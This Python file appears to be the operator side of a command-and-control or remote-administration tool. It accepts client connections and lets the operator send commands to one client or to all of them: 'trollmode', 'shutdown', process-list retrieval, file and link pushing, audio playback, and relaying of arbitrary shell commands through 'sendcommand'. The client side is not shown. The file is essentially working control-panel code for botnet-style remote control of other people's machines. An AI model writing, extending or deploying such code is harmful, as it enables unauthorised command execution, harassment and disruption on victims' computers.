import socket
import threading

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.bind(("127.0.0.1", 62121))

clients_conn_list = []
clients_addr_list = []

def process_input():
    while True:
        input_data = input("> ")
        if input_data == "list":
            print("")
            for x in range(0, len(clients_addr_list)):
                print("[" + str(x) + "] " + "-"*6)
                print(" "*2 + clients_addr_list[x][0])
                print(" "*2 + str(clients_addr_list[x][1]))
            print("")
        elif "trollmode" in input_data:
            target = int(input_data.replace("trollmode ", ""))
            if target == 999:
                target = 0
                l = len(clients_conn_list)
                l = l - 1
                print(l)
                if target < l:
                    while target <= l:
                        try:
                            clients_conn_list[target].sendall("trollmode".encode("utf-8"))
                            print("Sent trollmode coommand")
                        except:
                            clients_conn_list.pop(target)
                            clients_addr_list.pop(target)
                            print("Error: Could not access client. Removing from list")
                        target = target + 1
                        print("done")
                else:
                    try:
                        clients_conn_list[target].sendall("trollmode".encode("utf-8"))
                        print("Sent trollmode coommand")
                    except:
                        clients_conn_list.pop(target)
                        clients_addr_list.pop(target)
                        print("Error: Could not access client. Removing from list")
            else:
                try:
                    clients_conn_list[target].sendall("trollmode".encode("utf-8"))
                    print("Sent trollmode coommand")
                except:
                    clients_conn_list.pop(target)
                    clients_addr_list.pop(target)
                    print("Error: Could not access client. Removing from list")
        elif "exitloop" in input_data:
            target = int(input_data.replace("exitloop ", ""))
            if target == 999:
                target = 0
                l = len(clients_conn_list)
                l = l - 1
                print(l)
                if target < l:
                    while target <= l:
                        try:
                            clients_conn_list[target].sendall("exitloop".encode("utf-8"))
                        except:
                            clients_conn_list.pop(target)
                            clients_addr_list.pop(target)
                            print("Error: Could not access client. Removing from list")
                        target = target + 1
                        print("done")
                else:
                    try:
                        clients_conn_list[target].sendall("exitloop".encode("utf-8"))
                        print("Sent print command")
                    except:
                        clients_conn_list.pop(target)
                        clients_addr_list.pop(target)
                        print("Error: Could not access client. Removing from list")
            else:
                try:
                    clients_conn_list[target].sendall("exitloop".encode("utf-8"))
                except:
                    clients_conn_list.pop(target)
                    clients_addr_list.pop(target)
                    print("Error: Could not access client. Removing from list")
        elif "print" in input_data:
            target = int(input_data.replace("print ", ""))
            input_data = input("Print> ")
            if target == 999:
                target = 0
                l = len(clients_conn_list)
                l = l - 1
                print(l)
                if target < l:
                    while target <= l:
                        try:
                            clients_conn_list[target].sendall(("print " + input_data).encode("utf-8"))
                            print("Sent print command")
                        except:
                            clients_conn_list.pop(target)
                            clients_addr_list.pop(target)
                            print("Error: Could not access client. Removing from list")
                        target = target + 1
                        print("done")
                else:
                    try:
                        clients_conn_list[target].sendall(("print " + input_data).encode("utf-8"))
                        print("Sent print command")
                    except:
                        clients_conn_list.pop(target)
                        clients_addr_list.pop(target)
                        print("Error: Could not access client. Removing from list")
            else:
                try:
                    clients_conn_list[target].sendall(("print " + input_data).encode("utf-8"))
                    print("Sent print command")
                except:
                    clients_conn_list.pop(target)
                    clients_addr_list.pop(target)
                    print("Error: Could not access client. Removing from list")
        elif "shutdown" in input_data:
            target = int(input_data.replace("shutdown ", ""))
            if target == 999:
                target = 0
                l = len(clients_conn_list)
                l = l - 1
                print(l)
                if target < l:
                    while target <= l:
                        try:
                            clients_conn_list[target].sendall("shutdown".encode("utf-8"))
                            print("Sent shutdown command")
                        except:
                            clients_conn_list.pop(target)
                            clients_addr_list.pop(target)
                            print("Error: Could not access client. Removing from list")
                        target = target + 1
                        print("done")
                else:
                    try:
                        clients_conn_list[target].sendall("shutdown".encode("utf-8"))
                        print("Sent shutdown command")
                    except:
                        clients_conn_list.pop(target)
                        clients_addr_list.pop(target)
                        print("Error: Could not access client. Removing from list")
            else:
                try:
                    clients_conn_list[target].sendall("shutdown".encode("utf-8"))
                    print("Sent shutdown command")
                except:
                    clients_conn_list.pop(target)
                    clients_addr_list.pop(target)
                    print("Error: Could not access client. Removing from list")
        elif "tasklist" in input_data:
            target = int(input_data.replace("tasklist ", ""))
            if target == 999:
                target = 0
                l = len(clients_conn_list)
                l = l - 1
                print(l)
                if target < l:
                    while target <= l:
                        try:
                            clients_conn_list[target].sendall("tasklist".encode("utf-8"))
                            tasklist_data = (clients_conn_list[target].recv(8192)).decode("utf-8")
                            print(tasklist_data)
                        except:
                            clients_conn_list.pop(target)
                            clients_addr_list.pop(target)
                            print("Error: Could not access client. Removing from list")
                        target = target + 1
                        print("done")
                else:
                    try:
                        clients_conn_list[target].sendall("tasklist".encode("utf-8"))
                        tasklist_data = (clients_conn_list[target].recv(8192)).decode("utf-8")
                        print(tasklist_data)
                    except:
                        clients_conn_list.pop(target)
                        clients_addr_list.pop(target)
                        print("Error: Could not access client. Removing from list")
            else:
                try:
                    clients_conn_list[target].sendall("tasklist".encode("utf-8"))
                    tasklist_data = (clients_conn_list[target].recv(8192)).decode("utf-8")
                    print(tasklist_data)
                except:
                    clients_conn_list.pop(target)
                    clients_addr_list.pop(target)
                    print("Error: Could not access client. Removing from list")
        elif "sendfile" in input_data:
            target = int(input_data.replace("sendfile ", ""))
            clients_conn_list[target].sendall(("sendfile").encode("utf-8"))
            if target == 999:
                target = 0
                l = len(clients_conn_list)
                l = l - 1
                print(l)
                if target < l:
                    while target <= l:
                        try:
                            file = open("update_file.txt", "r")
                            file_data = file.read()
                            clients_conn_list[target].sendall((file_data).encode("utf-8"))
                        except:
                            clients_conn_list.pop(target)
                            clients_addr_list.pop(target)
                            print("Error: Could not access client. Removing from list")
                        target = target + 1
                        print("done")
                else:
                    try:
                        file = open("update_file.txt", "r")
                        file_data = file.read()
                        clients_conn_list[target].sendall((file_data).encode("utf-8"))
                    except:
                        clients_conn_list.pop(target)
                        clients_addr_list.pop(target)
                        print("Error: Could not access client. Removing from list")
            else:
                try:
                    file = open("update_file.txt", "r")
                    file_data = file.read()
                    clients_conn_list[target].sendall((file_data).encode("utf-8"))
                except:
                    clients_conn_list.pop(target)
                    clients_addr_list.pop(target)
                    print("Error: Could not access client. Removing from list")
        elif "sendvoice" in input_data:
            target = int(input_data.replace("sendvoice ", ""))
            voice = input("voice>")
            if target == 999:
                target = 0
                l = len(clients_conn_list)
                l = l - 1
                print(l)
                if target < l:
                    while target <= l:
                        try:
                          clients_conn_list[target].sendall("sendvoice".encode("utf-8"))
                          clients_conn_list[target].sendall(voice.encode("utf-8"))
                        except:
                            clients_conn_list.pop(target)
                            clients_addr_list.pop(target)
                            print("Error: Could not access client. Removing from list")
                        target = target + 1
                        print("done")
                else:
                    try:
                        clients_conn_list[target].sendall("sendvoice".encode("utf-8"))
                        clients_conn_list[target].sendall(voice.encode("utf-8"))
                    except:
                        clients_conn_list.pop(target)
                        clients_addr_list.pop(target)
                        print("Error: Could not access client. Removing from list")
            else:
                try:
                    clients_conn_list[target].sendall("sendvoice".encode("utf-8"))
                    clients_conn_list[target].sendall(voice.encode("utf-8"))
                except:
                    clients_conn_list.pop(target)
                    clients_addr_list.pop(target)
                    print("Error: Could not access client. Removing from list")
        elif "sendlink" in input_data:
            target = int(input_data.replace("sendlink ", ""))
            link = input("link>")
            if target == 999:
                target = 0
                l = len(clients_conn_list)
                l = l - 1
                print(l)
                if target < l:
                    while target <= l:
                        try:
                            clients_conn_list[target].sendall("sendlink".encode("utf-8"))
                            clients_conn_list[target].sendall(link.encode("utf-8"))
                        except:
                            clients_conn_list.pop(target)
                            clients_addr_list.pop(target)
                            print("Error: Could not access client. Removing from list")
                        target = target + 1
                        print("done")
                else:
                    try:
                        clients_conn_list[target].sendall("sendlink".encode("utf-8"))
                        clients_conn_list[target].sendall(link.encode("utf-8"))
                    except:
                        clients_conn_list.pop(target)
                        clients_addr_list.pop(target)
                        print("Error: Could not access client. Removing from list")

            else:
                try:
                    clients_conn_list[target].sendall("sendlink".encode("utf-8"))
                    clients_conn_list[target].sendall(link.encode("utf-8"))
                except:
                    clients_conn_list.pop(target)
                    clients_addr_list.pop(target)
                    print("Error: Could not access client. Removing from list")

        elif "sendcommand" in input_data:
            target = int(input_data.replace("sendcommand ", ""))
            command = input("command>")
            if target == 999:
                target = 0
                l = len(clients_conn_list)
                l = l - 1
                print(l)
                if target < l:
                    while target <= l:
                        try:
                            clients_conn_list[target].sendall("sendcommand".encode("utf-8"))
                            clients_conn_list[target].sendall(command.encode("utf-8"))
                        except:
                            clients_conn_list.pop(target)
                            clients_addr_list.pop(target)
                            print("Error: Could not access client. Removing from list")
                        target = target + 1
                        print("done")
                else:
                    try:
                        clients_conn_list[target].sendall("sendcommand".encode("utf-8"))
                        clients_conn_list[target].sendall(command.encode("utf-8"))
                    except:
                        clients_conn_list.pop(target)
                        clients_addr_list.pop(target)
                        print("Error: Could not access client. Removing from list")
            else:
                try:
                    clients_conn_list[target].sendall("sendcommand".encode("utf-8"))
                    clients_conn_list[target].sendall(command.encode("utf-8"))
                except:
                    clients_conn_list.pop(target)
                    clients_addr_list.pop(target)
                    print("Error: Could not access client. Removing from list")
        elif "sinewave" in input_data:
            target = int(input_data.replace("sinewave ", ""))
            pt = input("pitch>")
            dt = input("duration>")
            if target == 999:
                target = 0
                l = len(clients_conn_list)
                l = l - 1
                print(l)
                if target < l:
                    while target <= l:
                        try:
                            clients_conn_list[target].sendall("sinewave".encode("utf-8"))
                            clients_conn_list[target].sendall(pt.encode("utf-8"))
                            clients_conn_list[target].sendall(dt.encode("utf-8"))
                        except:
                            clients_conn_list.pop(target)
                            clients_addr_list.pop(target)
                            print("Error: Could not access client. Removing from list")
                        target = target + 1
                        print("done")
                else:
                    try:
                        clients_conn_list[target].sendall("sinewave".encode("utf-8"))
                        clients_conn_list[target].sendall(pt.encode("utf-8"))
                        clients_conn_list[target].sendall(dt.encode("utf-8"))
                    except:
                        clients_conn_list.pop(target)
                        clients_addr_list.pop(target)
                        print("Error: Could not access client. Removing from list")
            else:
                try:
                    clients_conn_list[target].sendall("sinewave".encode("utf-8"))
                    clients_conn_list[target].sendall(pt.encode("utf-8"))
                    clients_conn_list[target].sendall(dt.encode("utf-8"))
                except:
                    clients_conn_list.pop(target)
                    clients_addr_list.pop(target)
                    print("Error: Could not access client. Removing from list")



threading.Thread(target = process_input).start()

while True:
    s.listen()
    conn, addr = s.accept()
    clients_conn_list.append(conn)
    clients_addr_list.append(addr)